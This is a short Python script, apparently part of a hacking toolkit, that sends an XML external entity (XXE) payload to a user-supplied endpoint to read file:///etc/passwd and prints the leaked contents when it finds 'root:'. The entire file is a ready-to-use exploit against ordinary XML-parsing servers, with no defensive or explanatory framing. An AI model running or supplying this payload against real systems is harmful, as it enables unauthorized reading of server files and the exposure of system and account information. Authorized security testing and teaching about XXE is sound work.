import requests
from colorama import Fore

def run():
    url = input("\n[+] Enter XML Endpoint: ").strip()
    payload = """<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"""
    
    try:
        response = requests.post(url, data=payload)
        if "root:" in response.text:
            print(Fore.GREEN + "[+] Vulnerable to XXE!")
            print(Fore.CYAN + response.text[:200])
        else:
            print(Fore.RED + "[!] Not vulnerable to XXE")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {str(e)}")